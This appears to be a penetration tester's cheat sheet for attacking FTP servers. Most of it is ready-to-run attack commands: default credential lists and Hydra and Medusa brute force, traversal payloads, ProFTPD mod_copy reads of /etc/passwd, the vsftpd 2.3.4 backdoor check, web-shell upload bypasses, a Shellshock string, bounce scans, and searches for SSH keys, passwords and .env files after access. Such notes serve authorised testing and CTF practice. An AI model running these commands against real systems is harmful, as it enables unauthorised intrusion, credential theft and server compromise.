
## Key Indicators
- Anonymous login allowed (anonymous user with blank/common passwords)
- World-readable or writable files/directories
- Sensitive files exposed (configs, backups, logs)
- Outdated FTP software with known vulnerabilities
- Use of cleartext FTP (not FTPS/SFTP)
- Misconfigured virtual users/ACLs
- Presence of .bash_history, .ftp_history files
- Ability to upload executables/scripts
- SITE command execution capability
- Revealing error messages (usernames/dirs)

## Initial Recon & Fingerprinting

### Service Detection
```bash
# Basic scan
nmap -sV -p 21 -v $target
# Look for: FTP banner, version info, anonymous status

# Full FTP script scan
sudo nmap -sV -sC -p 21 $target --script=ftp*
# Look for:
#  - ftp-anon: Anonymous login allowed?
#  - ftp-syst: System type info
#  - ftp-proftpd-backdoor: ProFTPD 1.3.3c backdoor
#  - ftp-vsftpd-backdoor: VsFTPD 2.3.4 backdoor
#  - ftp-vuln-cve2010-4221: Common vulnerabilities

# Banner grab with netcat
nc -nv $target 21
# Look for: Server type, version, OS info

# SSL/TLS check
openssl s_client -connect $target:21 -starttls ftp
```

### Default Credentials by Server
```bash
# vsftpd
admin:admin
ftp:ftp
admin:[blank]

# ProFTPd
admin:admin
root:[blank]

# Pure-FTPd
pure-ftp:pure-ftp
admin:[blank]

# FileZilla Server
admin:admin
admin:password
```

## Enumeration Phase

### Anonymous Access
```bash
# Method 1: Standard FTP
ftp $target
> anonymous
> anonymous@domain.com

# Method 2: With cURL
curl -v ftp://$target/

# Method 3: Wget recursive
wget -r --no-passive ftp://anonymous:anonymous@$target
wget -m --no-passive ftp://anonymous:anonymous@$target

# Quick anonymous check script
ftp -n $target << EOF
quote USER anonymous
quote PASS anonymous
ls
quit
EOF
```

### Basic FTP Commands
```bash
ls -al       # List files with details
pwd          # Print working directory
cd <dir>     # Change directory
get <file>   # Download file
mget *       # Download multiple files
put <file>   # Upload file
mput *       # Upload multiple files
binary       # Binary transfer mode
ascii        # ASCII transfer mode
help         # List commands
quit         # Exit session
```

### Directory Traversal
```bash
# Basic traversal
ftp> ls ../
ftp> ls ../../
ftp> cd ../../../

# Encoded traversal
ftp> ls %2e%2e/
ftp> ls %2e%2e%2f%2e%2e%2f

# Unicode/UTF-8
ftp> ls %c0%ae%c0%ae/
```

### Brute Force
```bash
# Hydra username enum
hydra -L /usr/share/seclists/Usernames/Names/names.txt -e ns -V ftp://$target
# Look for: "Login incorrect" vs "Password required"

# Password attack
hydra -l found_user -P /usr/share/wordlists/rockyou.txt ftp://$target

# Medusa username enum
medusa -h $target -U /usr/share/seclists/Usernames/Names/names.txt -n 21 -M ftp -e ns
```

## Vulnerability Testing

### Version-Specific Attacks
```bash
# ProFTPD mod_copy (<1.3.5)
SITE CPFR /etc/passwd
SITE CPTO passwd.copy

# vsftpd 2.3.4 backdoor
# Check port 6200 after sending malformed USER
nc -v $target 6200

# Pure-FTPd symlink
ln -s /etc/passwd passwd.link
put passwd.link
get passwd.link
```

### File Upload Testing
```bash
# Extension tests
put shell.php.jpg
put shell.php%00.jpg
put shell.php;.jpg
put .htaccess

# Upload dir tests
mkdir backup
put test.txt backup/
chmod 777 backup    # If SITE CHMOD works

# Large file handling
dd if=/dev/zero of=large_file bs=1M count=100
put large_file
```

### Command Injection
```bash
# SITE command tests
SITE EXEC whoami
SITE CHMOD 777 test.txt
SITE INDEX *
SITE HELP
SITE CPFR /path/to/source
SITE CPTO /path/to/destination

# Shellshock (if CGI enabled)
PUT () { :;}; /bin/bash -c 'command'
```

### FTP Bounce Attack
```bash
# Nmap bounce scan
sudo nmap -p 1-1024 -sV -b anonymous:anonymous@$target:21 $target_to_scan

# Manual bounce test
nc $target 21
USER anonymous
PASS anonymous
PORT 192,168,1,10,80,25
LIST
```

### FTPS and SFTP Testing
```bash
# FTPS explicit
lftp -e "set ftp:ssl-allow true; set ssl:verify-certificate no" ftps://$target

# FTPS implicit (port 990)
lftp -p 990 -e "set ftp:ssl-allow true; set ssl:verify-certificate no" ftps://$target

# SFTP
sftp user@$target

# FTPS with curl
curl -k -u user:pass ftps://$target
```

### File Permissions Abuse
```bash
# List all permissions
ls -la

# Symlink test
ln -s /etc/passwd link_to_passwd
put link_to_passwd

# RETR/STOR abuse
RETR /etc/passwd
RETR /proc/self/cmdline
RETR /proc/version

STOR ../../../tmp/file
STOR /proc/self/cwd/uploads/file
```

### Passive Mode Testing
```bash
# Toggle modes
ftp> passive
ftp> active

# Test transfers in each mode
ls
get test_file
```

### Custom Command Testing
```bash
# List available commands
help

# Fuzz commands
for cmd in $(cat command_wordlist.txt); do
  echo "Sending command: $cmd"
  (echo "USER user"; echo "PASS pass"; echo "$cmd"; sleep 1) | nc $target 21
done
```

## Post-Exploitation

### Sensitive Data Discovery
```bash
# Find credentials
find . -type f -exec grep -Hi "password\|username\|key" {} \;

# Database files
find . -type f -name "*.db" -o -name "*.sqlite" -o -name "*.kdbx"

# SSH keys
find . -name "id_rsa" -o -name "*.pem"

# Config files
find . -name "wp-config.php" -o -name ".env" -o -name "config.php"
```

### Evidence Collection
```bash
# Log session
script ftp_session.log
ftp $target
exit

# Capture traffic
tcpdump -w ftp_capture.pcap port 21

# Directory listings
for d in $(find . -type d); do
  ls -laR "$d" >> directory_listing.txt
done
```

## Common Patterns to Check
- pub/ (public directory)
- incoming/ (writable directory)
- data/, files/ (sensitive data)
- .backup, .old, .zip, .tar.gz
- .conf, .ini, .xml
- .log files
- scripts/ directory
- users/ directory

## Wordlists
```bash
# Username lists
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# Password lists
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt

# Directory lists
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

## Quick Wins (Severity Rating)

CRITICAL (9.0-10.0):
- RCE via SITE EXEC
- Unauth file read/write
- Default admin creds

HIGH (7.0-8.9):
- Anonymous upload to web root
- Clear-text credentials
- Directory traversal
- Command execution via SITE
- Bounce attack successful

MEDIUM (4.0-6.9):
- Anonymous read
- Version disclosure
- Weak credentials
- World-readable sensitive files

LOW (0.1-3.9):
- Banner info
- Directory listing
- Predictable naming
- Non-critical information disclosure



# General Notes: 
Always try anonymous login if it is avaliable: 

Username: anonymous
Password: anonymous (or keys you want to put in.)

# FTP Enumeration Tools
## Manual Connection
```
$ ftp 172.21.0.0
```
```
$ nc -vn 172.21.0.0 21
```
## Connect via Browser
```
ftp://172.21.0.0
```

## Nmap FTP Enumeration
```

$ ls -lh /usr/share/nmap/scripts/ | grep ftp
-rw-r--r-- 1 root root 4.5K Oct 12 09:29 ftp-anon.nse
-rw-r--r-- 1 root root 3.2K Oct 12 09:29 ftp-bounce.nse
-rw-r--r-- 1 root root 3.1K Oct 12 09:29 ftp-brute.nse
-rw-r--r-- 1 root root 3.2K Oct 12 09:29 ftp-libopie.nse
-rw-r--r-- 1 root root 3.3K Oct 12 09:29 ftp-proftpd-backdoor.nse
-rw-r--r-- 1 root root 3.7K Oct 12 09:29 ftp-syst.nse
-rw-r--r-- 1 root root 5.9K Oct 12 09:29 ftp-vsftpd-backdoor.nse
-rw-r--r-- 1 root root 5.8K Oct 12 09:29 ftp-vuln-cve2010-4221.nse
-rw-r--r-- 1 root root 5.7K Oct 12 09:29 tftp-enum.nse
$ nmap x.x.x.x -p 21 -sV --script=exampleScript1.nse,exampleScript2.nse
```

## CrackMapExec

```
- crackmapexec ftp 172.21.0.0
- crackmap exec ftp 172.21.0.0 -u 'a' -p ''
- crackmapexec ftp 172.21.0.0 -u 'anonymous' -p '''

# FTP Default wordlists: 
/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt

```
